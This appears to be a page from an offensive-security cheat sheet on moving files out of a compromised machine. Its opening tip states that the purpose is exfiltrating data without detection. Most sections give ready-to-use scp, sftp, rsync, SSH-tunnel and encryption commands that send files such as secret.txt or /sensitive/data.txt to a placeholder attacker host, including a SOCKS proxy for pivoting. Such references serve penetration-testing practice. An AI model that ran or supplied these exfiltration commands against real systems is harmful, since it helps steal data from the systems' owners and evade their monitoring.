# Secure Transfers

!!! tip "Tip"
    Use `scp` or `sftp` when SSH is available — fastest and encrypted by default. For exfiltrating over HTTP without detection, encode files with `base64` and send as POST body parameters rather than binary uploads.

---

## SCP

```bash
# Linux to Linux
scp secret.txt <user>@<attacker-ip>:/tmp/
```

```powershell
# Windows to Linux
scp C:\Users\Public\secret.txt <user>@<attacker-ip>:/home/<user>/
```

---

## SFTP

### Interactive

```bash
sftp <user>@<attacker-ip>
put secret.txt
exit
```

### Automated

```bash
echo "put secret.txt" > sftp_commands.txt
sftp -b sftp_commands.txt <user>@<attacker-ip>
```

---

## OpenSSL File Encryption

```bash
# Encrypt
openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc -k SuperSecretKey

# Decrypt after transfer
openssl enc -aes-256-cbc -d -in secret.enc -out secret.txt -k SuperSecretKey
```

---

## GPG Encryption

```bash
# Encrypt
gpg --output secret.gpg --encrypt --recipient attacker@example.com secret.txt

# Decrypt after transfer
gpg --output secret.txt --decrypt secret.gpg
```

---

## rsync over SSH

```bash
rsync -avz -e ssh /path/to/data <user>@<attacker-ip>:/tmp/
```

---

## SSH Tunneling

### Local Port Forward for File Transfer

```bash
ssh -L 9001:10.10.10.10:22 <user>@<attacker-ip>
scp -P 9001 <user>@localhost:/sensitive/data.txt /safe/location/
```

### SOCKS5 Proxy

```bash
ssh -D 1080 <user>@<attacker-ip>
```

Configure `curl` or `wget` to use `socks5://127.0.0.1:1080`.

---

## HTTPS Transfers

```powershell
Invoke-WebRequest -Uri "https://secure-server.com/data" -OutFile "C:\Users\Public\data.txt"
```

```bash
curl -k -O https://secure-server.com/secret.txt
```
